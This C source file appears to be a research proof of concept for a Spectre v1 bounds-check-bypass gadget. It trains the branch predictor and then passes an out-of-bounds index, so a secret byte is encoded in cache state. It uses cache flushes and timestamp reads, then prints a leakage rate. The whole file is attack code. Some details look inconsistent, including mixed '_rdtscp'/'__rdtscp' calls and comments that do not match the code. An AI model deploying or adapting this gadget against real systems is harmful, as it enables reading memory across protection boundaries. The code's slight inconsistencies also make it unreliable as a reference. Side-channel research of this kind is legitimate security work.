#include <stdio.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
/*secret(array1[malicious_x]) is in cache, Ni is not in cache*/

#define LOADS_NUM 1
#define N_NUM 1
#define I_NUM 30

int N[20][16]; //N[N[N[N[N[N[5][0]][0]][0]][0]][0]][0]
int malicious_x = 100;
uint8_t array1[101];
uint8_t unuse[128];
uint8_t p[64 * LOADS_NUM + 1]; //64 * #loads in branch
uint8_t unsed3[128];
int e[I_NUM][16];

void victim(size_t x) {
	if(x < N[0][0]) {
		register uint8_t secret = array1[x]; //use malicous_x to access secret
		/* some loads */
		volatile register uint8_t * addr1 = p + secret * 64;
		register uint8_t temp1 = *addr1; 
	}
}

int main(){
	register int time1,time2,time3,time4;
	int junk = 0;   
	N[0][0] = 16;
	for(int i = N_NUM - 1; i > 0; i--)
		N[i][0] = i - 1;
	array1[1] = 0;
	array1[100] = 0; //secret value
	size_t training_x = 1, x;
	register uint8_t temp;
	time3 = _rdtscp(&junk);

	for(int i = 5; i >= 0; i--) {
		p[0] = p[64] = 1;
		for(int j = 0; j < I_NUM; j++)
		    e[j][0] = 1;

		_mm_mfence();

		for(int j = 0; j < N_NUM; j++)
			_mm_clflush(&N[j][0]);

		_mm_mfence();

		for(int j = 0; j < I_NUM; j++)
			_mm_clflush(&e[j][0]);

		_mm_mfence();
	
		for(int k = 1; k <= LOADS_NUM; k++)
			_mm_clflush(&p[64 * k]);
	
		temp = array1[100];
		temp = p[0];
		_mm_mfence();
		/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
		/* Avoid jumps in case those tip off the branch predictor */
		x = ((i % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
		x = training_x ^ (x & (malicious_x ^ training_x));
	
		_mm_mfence();
		time1 = __rdtscp(&junk);
		victim(x);
		time2 = __rdtscp(&junk) - time1;
		_mm_mfence();
	}
	time4 = _rdtscp(&junk) - time3;
	printf("%d\n",time4);
	double leakageRate = (1 * 1000000000) / time4;
	printf("leakage rate for 1Ghz CPU: %f\n", leakageRate);
	return 0;
}
